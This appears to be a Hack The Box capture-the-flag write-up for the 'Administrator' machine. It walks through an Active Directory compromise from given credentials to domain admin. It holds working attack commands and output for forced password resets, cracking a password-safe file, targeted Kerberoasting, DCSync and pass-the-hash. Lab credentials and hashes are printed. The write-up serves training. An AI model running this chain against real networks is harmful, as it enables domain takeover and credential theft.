# Administrator

Olivia:ichliebedich

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -T4 administrator.htb 
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-17 11:05 EDT
Nmap scan report for administrator.htb (10.10.11.42)
Host is up (0.23s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Host script results:
| smb2-time: 
|   date: 2025-10-17T22:06:19
|_  start_date: N/A
|_clock-skew: 7h00m10s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Test the given credentials

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb administrator.htb -u 'olivia' -p 'ichliebedich'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\\olivia:ichliebedich
```

Nothing seems interesting about SMB shares

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb administrator.htb -u 'olivia' -p 'ichliebedich' --shares 
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
```

Run the bloodhound ingestor

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap administrator.htb -u 'olivia' -p 'ichliebedich' --bloodhound --collection All --dns-server 10.10.11.42 
[*] Initializing LDAP protocol database
LDAP        10.10.11.42     389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
LDAP        10.10.11.42     389    DC               [+] administrator.htb\\olivia:ichliebedich 
LDAP        10.10.11.42     389    DC               Resolved collection methods: psremote, session, trusts, dcom, rdp, container, localadmin, acl, group, objectprops
LDAP        10.10.11.42     389    DC               Done in 00M 33S
LDAP        10.10.11.42     389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.10.11.42_2025-10-17_111251_bloodhound.zip
```

We get the following path to the Share Moderator Group

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FWwAuu5tsQQAZDIRGIxAa%2Fimage.png?alt=media&#x26;token=73ef1180-35e0-4010-8437-7072242eccc7" alt=""><figcaption></figcaption></figure>

Olivia has GenericAll over Michael, so we can force change his password

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ net rpc password "michael" 'Hacked123!' -U "olivia"%"ichliebedich" -S "administrator.htb"

┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb administrator.htb -u 'michael' -p 'Hacked123!'                                                   
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\\michael:Hacked123!
```

Michael can force the password change for the user benjamin

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ net rpc password "benjamin" 'H@cked123' -U "michael"%'Hacked123!' -S "administrator.htb"

┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb administrator.htb -u 'benjamin' -p 'H@cked123'                           
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\\benjamin:H@cked123
```

There is a FTP server, we try to login with benjamin new password and we find a backup password file

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 10.10.11.42         
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:kali): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls 
229 Entering Extended Passive Mode (|||49860|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||49862|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|   952        4.54 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (3.06 KiB/s)
```

It asks for a password, so we get the file hash and crack it

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ pwsafe2john Backup.psafe3 > hash

┌──(kali㉿kali)-[~/Downloads]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-10-17 12:06) 4.000g/s 32768p/s 32768c/s 32768C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
```

We can then open the file and get the passwords

We are interested in the emily password

emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc.administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'  
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

Emily can target kerberoast ethan

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FiRH8azGGiqwWzDetGGji%2Fimage.png?alt=media&#x26;token=8352649f-6705-4645-8f7d-adb8393a8462" alt=""><figcaption></figcaption></figure>

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo rdate -n 10.10.11.42                                                                                    
[sudo] password for kali: 
$$Fri Oct 17 20:11:28 EDT 2025
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 windows/targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$8ecc2b027eae76d9d153996482031e59$e62b3b78be4354756b28bb974ee753c3d20b6c1d63db0f1dd4a5d40d6bc9d7b6ff142bd90fe87b9d81ccab657f622234cf46c0696332eac0b0936478b63a3ffa6032aaf562ef9c0fd9ad1d82b5dabb4551c31f5cdfc81ac7f7b8c39b5e2893f8cf79811260d54b0e10239801c212f01d514b420ebfd214984c214d355b530b3e14fccc75aa510b2d6566cd32f46cf14be3a981ce019ee42af7c048467875086d7e700865ba3df4e30f8aedfa9359ee0bf5350b6cda8b29837f6e99454471e9871f27c24131f1d00c7bdf88e9065902a66fda2d5f87d39634efd52e19cd19f6b25f24fc9a7c157e7e889fad456b21661179c34172a891eca8739e07fde41d1388fd5145da65a7ce27438f404626666d4dc43d12f2846c6ca09e5722889bca86f29556b159ef653358547eb6c2b518b6cbb89cf41328782a1c8c1323739e77f41487d988ad0eb802fc7b433b33cdfce184a9e53f5ff2d8c0ee0800ff4eec32208f5799d1330166d66f65cbd1985190be6f6d3f892efb06ffc37afa26fee43d5538bd3c5759d41521cea344973e0f24fbdc178831aa8220b7bb3f997c9d17fad39d082281b7b836cdeba42b23d49fca2c5d3215eb89ff880456eedfadbc284c9a42b0af1ebaddd56e6f70d4e770e49725b706356e6bf81b7180e7112d91a4a19dda5934e64537b4087ee74b8882d91c1053b7bcbc8f8732fb27454237b6fff28dce5b2531412b3300c1a6ff01c0f741c3e9980a679e40fd3a0b1e2229ac57562d8ccdda1e3d0bbe48e27b817a726a739ef78fa4f2cc0cb9fc31c1c234087ab6ccea14f85fe7df54ab7bcc202a95a012829c3cb72c6d506326b7728bfb998fd5976984c6c9a9b23b90b46f8fe6391e5f69c0542803fca1abe8ef6f11ff3b1cbdd2188eb70bc03565d91bb2a40ecc4efe15c63ae1f9a4813579f593d6bf9c95f61cd196444c84de374906e153e7bf21d0575dafd95fb71f09d96a3159a8d5a173d771e9c7e41ae90a5fad58fdff281c83a461b6a75f06e8e038d5bb5e2c7d579ec2ebe55afdb926329473e7ee9d9a6c8623e902d5d479cd151c5c0faf2d75925c6a9daad8dd79f459a34274985f0307b75ac6612eedf238d88c7cb59dfe025cd95d55fc8c8cf13a32371ccdc608fcbebbff2f594d0cc261a8b416a35bffd33f631b05c2ee35bceff825e6c8d6c0878ddcdee139375530403195603412e69b2324b95ef3b52ef5e78d48a078f9233586293e6a213210dd11d137a4e5803e61a90ea76f5db0fbdfe0d85d06d7261f533e2656e510d1773e0a483f6c92ce386a3309a37ea84aa90a16640d7a9cff1006d38d53667ff3bd915bce194b1912468198f21eb43cd7639c2031d0782b0d329cb33da489de8dcf9ac6135d7144bcf15cba108b9affbd897f01614fa19c43516ee4efb2007e0d7beec103174b79084cfc13720c5cd604a15878f81b67acb1a79164469be8acdff21f7e68fe6f1fbc5b21c9b14e032f93526dc136fdbae118cd730ff965d67c72c71b8f818d57da38edf27f767e
```

ethan:limpbizkit

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc.administrator.htb -u ethan -p 'limpbizkit'                    
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\\ethan:limpbizkit
```

Ethan has rights over the domaine. We can use this to DCSync the domain

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F417Xm12fpEDFxw7Axg2H%2Fimage.png?alt=media&#x26;token=7b5ccc05-ea65-4ba9-9d55-1b9fa933a9d7" alt=""><figcaption></figcaption></figure>

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'dc.administrator.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```

We can use the Administrator hash to log in with winRM via PtH

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i dc.administrator.htb -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>
```
